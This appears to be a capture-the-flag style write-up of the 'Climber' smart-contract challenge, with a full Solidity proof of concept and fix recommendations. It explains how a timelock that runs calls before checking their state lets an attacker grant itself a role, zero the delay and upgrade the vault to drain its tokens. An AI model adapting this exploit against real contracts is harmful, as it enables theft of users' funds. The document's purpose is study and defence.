## Privileges Escalation and Fund Theft via execute Function 

The `execute` function on the `ClimberTimelock` contract, first performs the requested calls before validating the state of the scheduled action. An attacker can exploit this sequence to bypass the validation and execute arbitrary code. The attack unfolds in three main steps:

- Granting `PROPOSER_ROLE`: An attacker grants themselves the `PROPOSER_ROLE` by calling the `grantRole` function.
- Setting a Zero Delay: calls `updateDelay` to set the timelock's delay to 0, ensuring that any proposed action can be executed immediately.
- Self-Registration: To prevent the execute function from reverting at its final state check, the attacker uses the newly acquired `PROPOSER_ROLE` to schedule the current malicious action. Because the execute function runs the scheduled action's calls before checking its state, by the time the state check is performed, the action is already registered and valid.

Once these steps are completed, the attacker gains full control over the timelock and can propose and execute any action. This allows them to propose a contract upgrade to a malicious implementation with a new function that transfer all funds from the vault to a specified address.

## PoC
The new version of the contract with our malicious code:
```solidity
// it need to inherits ClimberVault because the Proxy checks for the new contract to be Proxiable
contract MaliciousImplementation is ClimberVault {
    function recoverFunds(DamnValuableToken token, address recovery) public {
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
```

The `Proposer` contract (acting as a `man in the middle`):
```solidity
contract Proposer {

    bytes[] realCallsData;

    function setCallsData(bytes[] memory rde) public {
        realCallsData = rde;
    }

    function propose(
        ClimberTimelock timelock,
        address[] memory targets,
        uint256[] memory values,
        bytes32 salt
    ) public {
        timelock.schedule(
            targets,
            values,
            realCallsData,
            salt
        );
    }

    function attack(ClimberTimelock timelock, address vault, DamnValuableToken token, address recovery) public {
        MaliciousImplementation maliciousImplementation = new MaliciousImplementation();

        address[] memory targets = new address[](1);
        targets[0] = vault;
        uint256[] memory values = new uint256[](1);

        bytes[] memory callsData = new bytes[](1);
        callsData[0] = abi.encodeWithSignature(
            'upgradeToAndCall(address,bytes)',
            address(maliciousImplementation),
            // HERE IS THE CALL TO RECOVER THE FUNDS 
            abi.encodeCall(MaliciousImplementation.recoverFunds, (token, recovery)) // executed on initialization 
        );
        
        bytes32 salt = '1';
        
        timelock.schedule(
            targets,
            values,
            callsData,
            salt
        );

        timelock.execute(targets, values, callsData, salt);
    }
}
```

and the test suite:
```solidity
    function test_climber() public 
    checkSolvedByPlayer 
    {
        // 1. Deploy Proposer
        Proposer proposerContract = new Proposer();

        // 2. Prepare targets
        address[] memory targets = new address[](3);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(proposerContract);

        // 3. Prepare values
        uint256[] memory values = new uint256[](3); // all 0s 

        // 4. Prepare salt
        bytes32 salt  = '1'; 

        // 5. Prepare data for calls
        // a) Grant to proposer contract PROPOSER_ROLE
        // b) set the updateDelay of timelock to 0, so proposed actions can be executed inmediatly (OperationState == ReadyForExecution)
        // c) To avoid `execute` to revert, we propose this current action, so when it checks for the id and it's state, this action will be already registered (lack of CEI pattern)
        // at this point, the proposer contract can propose any action over the vault. 
        // SO it propose an upgrade to a new malicious contract, with a `recoverFunds` that will transfer the funds of the vault to the recovery address.
        bytes memory grantRoleData = abi.encodeWithSignature('grantRole(bytes32,address)', PROPOSER_ROLE,address(proposerContract));
        bytes memory updateDelayData = abi.encodeWithSignature('updateDelay(uint64)', 0); 
        bytes memory proposerData = abi.encodeWithSignature(
            'propose(address,address[],uint256[],bytes32)',
            address(timelock),
            targets,
            values,
            salt
        );
        // ^^
        bytes[] memory dataElements = new bytes[](3);
        dataElements[0] = grantRoleData;
        dataElements[1] = updateDelayData;
        dataElements[2] = proposerData; // without calls data, to avoid circular dependencies btw dataElements and proposerData

        // 6. set the call data that will be sended to schedule 
        proposerContract.setCallsData(dataElements);

        // 7. Execute the actions
        timelock.execute(targets, values, dataElements, salt);
        
        // 8. Attack
        proposerContract.attack(timelock, address(vault), token, recovery);
    }
```


## Recomendations
- Follow the CEI pattern to avoid reentrancies on the `execute` function AKA checks for the state/validity of the action before execute it. 
- Add a more robust administration system such as implement a multisig wallet to manage delicated stuff like roles and privileges.
